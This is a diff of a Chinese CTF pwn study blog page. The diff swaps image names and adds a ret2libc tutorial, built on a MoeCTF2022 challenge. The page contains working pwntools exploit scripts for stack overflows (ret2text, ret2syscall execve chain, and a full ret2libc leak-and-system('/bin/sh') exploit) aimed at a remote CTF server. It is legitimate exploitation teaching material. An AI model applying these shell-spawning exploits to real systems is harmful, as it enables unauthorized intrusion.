@@ -44,12 +44,15 @@
 <meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/push_pop.png">
 <meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/%E6%A0%88%E5%B8%A7.png">
 <meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/pip-error.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230630181458474.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230630181512640.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230630182535293.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230710224440879.png">
+<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_main.png">
+<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_stack.png">
+<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_binsh.png">
+<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2sys_main.png">
+<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_vuln.png">
+<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_rdi.png">
+<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_ret.png">
 <meta property="article:published_time" content="2023-06-20T17:28:27.000Z">
-<meta property="article:modified_time" content="2023-07-15T01:47:16.272Z">
+<meta property="article:modified_time" content="2023-07-31T08:09:31.954Z">
 <meta property="article:author" content="hacbit">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/push_pop.png">
@@ -248,7 +251,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-07-15 09:47:16" itemprop="dateModified" datetime="2023-07-15T09:47:16+08:00">2023-07-15</time>
+                <time title="Modified: 2023-07-31 16:09:31" itemprop="dateModified" datetime="2023-07-31T16:09:31+08:00">2023-07-31</time>
               </span>
 
           
@@ -264,7 +267,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>4.8k</span>
+              <span>5.2k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
@@ -393,11 +396,9 @@
 <p><code>gcc -o pwn -fno-stack-protector -no-pie pwn.c</code></p>
 <p>scanf处没有对读取数据长度做检测，存在溢出</p>
 <p>不过直接说可能不好理解，看一下ida吧</p>
-<img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230630181458474.png" alt="image-20230630181458474;">
-
+<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_main.png" alt="main"></p>
 <p>栈空间：</p>
-<img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230630181512640.png" alt="image-20230630181512640">
-
+<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_stack.png" alt="stack"></p>
 <p>显然这里输入到了v4(对应到栈里面的var_30)，发现跟预想的0x20不一样，偷偷加了一些空间，而且多创建了一个不知道干什么的int变量。使用实际要填充的长度应该是</p>
 <p><code>offset = 0x2c + 0x4 + 0x8 = 0x38</code></p>
 <p>这里的0x2c是var_30的大小（可以看到左边一列数那里0x30和4相差了0x2c（不是26嗷））；</p>
@@ -405,7 +406,7 @@
 <p>然后后面的8个字节是rbp（i386就是4个字节（ebp）），可以看到s和r那里相差了8；</p>
 <p>然后再覆盖新的返回地址（如果有后门函数就返回到那里就好了）</p>
 <p>再一眼后门函数</p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230630182535293.png" alt="image-20230630182535293"></p>
+<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_binsh.png" alt="binsh"></p>
 <p>发现&#x2F;bin&#x2F;sh字符串在0x401144传参，所以就返回到0x401144，于是写出exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x401144</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -428,17 +429,39 @@
 <li><p>第三个参数，edx 为 0 &#x2F; rdx 为 0</p>
 </li>
 <li><p>最后返回 int 0x80(x86) &#x2F; syscall ret(x64)</p>
-<p>看一道例题：<a href="../resources/pwn_asset/ret2sys_64" target="_blank">ret2sys_64</a></p>
+<p>看一道例题：<a href="../resources/pwn_asset/study/ret2sys_64" target="_blank">ret2sys_64</a></p>
 </li>
 </ul>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/image-20230710224440879.png" alt="image-20230710224440879"></p>
+<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2sys_main.png" alt="main"></p>
 <p>程序里面没有现成的&#x2F;bin&#x2F;sh，所以可以用两次系统调用，一次读字符串，一次拿sh</p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2sys_64&#x27;</span>)</span><br><span class="line">rax = <span class="number">0x46b9f8</span></span><br><span class="line">rdi = <span class="number">0x4016c3</span></span><br><span class="line">rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">syscall = <span class="number">0x45bac5</span></span><br><span class="line">bss = <span class="number">0x6c1c60</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"><span class="comment"># 调用sys_read，用来读取后面输入的/bin/sh到bss段</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss) + p64(syscall)</span><br><span class="line"><span class="comment"># 调用execve来getshell</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0x3b</span>) + p64(rdi) + p64(bss)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;system_x64&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>当不知道题目libc版本<del>（现在的ctf应该不会还有比赛不给libc吧，不会吧不会吧~）</del>，并且存在足够的溢出空间，是可以通过泄露函数地址（实际上只需要低三位数字）来查找libc版本</p>
-<p>这里建议使用py的LibcSearcher库，这个库是在线查找的（也就是要联网）</p>
-<p>ret2libc的思路是构造ROP，来调用程序中的输出函数如：puts，write，来打印一些函数的地址，来达到泄露基地址的目的</p>
+
+
+<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>当不知道题目libc版本<del>（现在的ctf应该不会还有比赛不给libc吧，不会吧不会吧~）</del>，并且存在足够的溢出空间，是可以通过泄露函数地址（实际上只需要低三位数字）来查找libc版本，<strong>当然知道libc版本可能也会需要leak基地址来计算system等函数的地址</strong></p>
+<p>这里建议使用py的LibcSearcher库，这个库是在线查找的（也就是要联网），<del><em>也可以本地一个一个试</em></del></p>
+<p>ret2libc的思路是寻找程序中的gadget构造ROP，来调用程序中的输出函数如：puts，write，打印一些函数的地址，从而达到泄露基地址的目的</p>
+<p><strong>例题：</strong><a href="../resources/pwn_asset/study/ret2libc_x64" target="_block">MoeCTF2022_ret2libc</a></p>
+<p>在vuln函数里面就是一个简单的栈溢出，溢出长度足够构造ROP</p>
+<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_vuln.png" alt="vuln"></p>
+<p>覆盖的长度为0x40+0x8（rbp）&#x3D;0x48</p>
+<p>然后由于x64前六个参数用寄存器传，多的才是和x86一样栈传参，这前六个参数依次用rdi，rsi，rcx，rdx，r8，r9寄存器</p>
+<p>这里我们目的是通过puts函数来输出puts的got表中的地址来泄露puts的真实地址。</p>
+<p>所以要把puts_got作为参数传进puts函数里，也就是要用到rdi寄存器。<strong>（找gadget可以用ROPgadget）</strong></p>
+<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_rdi.png" alt="findrdi"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># .got指向函数在libc的真实地址</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># 也可以elf.sym[&#x27;puts&#x27;]，因为.plt存的就是函数的符号信息</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># 也可以填vuln函数地址，只要保证再用一次read就行</span></span><br></pre></td></tr></table></figure>
+
+<p>然后接收打印的地址，在查找libc版本，然后计算system，字符串&#x2F;bin&#x2F;sh的地址，就可以构造第二个payload</p>
+<p><strong>要注意：ubuntu18以上版本调用系统函数要栈对齐，一般在传参前加个ret的gadget就行</strong></p>
+<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_ret.png" alt="findret"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># 这么写是因为一般以\x7f结尾的6个字节</span></span><br><span class="line"></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果是给了你libc文件，本地加载时用ELF()就行，用法自然跟上面LibcSearcher的不一样</span></span><br><span class="line"><span class="string">example:</span></span><br><span class="line"><span class="string">	libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">	libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">	sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">	binsh_addr = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__() @py3</span></span><br><span class="line"><span class="string">							#libc.search(&#x27;/bin/sh&#x27;).next() @py2</span></span><br><span class="line"><span class="string">	py3中search()的参数必须是bytes，然后next方法多了下划线</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p><strong>完整exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>, <span class="number">28222</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>
+
+
+
 <p><strong>栈溢出小结：栈溢出是为了覆写某些数据来达到攻击者目的的一种手段，不能只是简单的背了什么ret2text，ret2libc等题型模板，更重要的是理解这种手段。而且溢出不只是scanf，read，gets这些，strcpy也是可以的，因为本质上都是由一个缓冲区复制到另一个缓冲区。另外覆写的数据也不尽就是返回地址了，像刚才在覆盖到ret之前顺便覆盖了一个int变量，在这里没看到什么作用，但是假如是一个关键数据（比如一个随机数），就可以起到很大用处了。</strong></p>
 <h2 id="ELF文件保护机制及基本绕过手法"><a href="#ELF文件保护机制及基本绕过手法" class="headerlink" title="ELF文件保护机制及基本绕过手法"></a>ELF文件保护机制及基本绕过手法</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3>
     </div>
@@ -906,7 +929,7 @@ if(canvas.getContext){
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">5k</span>
+    <span title="Symbols count total">6k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
@@ -920,7 +943,7 @@ if(canvas.getContext){
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">The blog has a total of 5.5k words</span>
+  <span class="post-count">The blog has a total of 6.2k words</span>
 </div>
 
 
